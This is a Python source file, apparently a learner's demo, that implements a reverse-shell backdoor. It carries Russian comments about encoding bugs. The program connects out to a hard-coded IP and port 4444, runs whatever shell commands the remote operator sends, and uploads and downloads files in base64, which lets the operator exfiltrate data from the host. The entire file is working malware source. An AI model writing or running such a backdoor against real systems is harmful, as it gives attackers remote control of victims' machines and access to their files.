import socket
import subprocess
import json
import os
import base64 #for downloading all formats
import sys
#DEMO

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell = True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    #def execute_system_command(self, command):
        #return subprocess.check_output(command, shell=True)
    #
    def reliable_send(self, data):
        if type(data) != str:#тестовая шляпа
            data = data.decode('cp1252')#перемещение по деректориям возможно только если убрать decode!!!!!!!!base64
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('cp1252'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    #
    def change_working_directory_to(self, path):

        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path): #for download
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):#for upload
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful "

    def run(self):
        while True:
            command = self.reliable_receive()  # из-за неверной декодировки не может считывать все команды
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()#тихо закрывает окно без выдачи ошибки
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":#TypeError: expected str, bytes or os.PathLike object, not list
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error duaring command execution "#
            self.reliable_send(command_result)#.encode('cp1252'))



my_backdoor = Backdoor("192.168.0.105", 4444)
my_backdoor.run()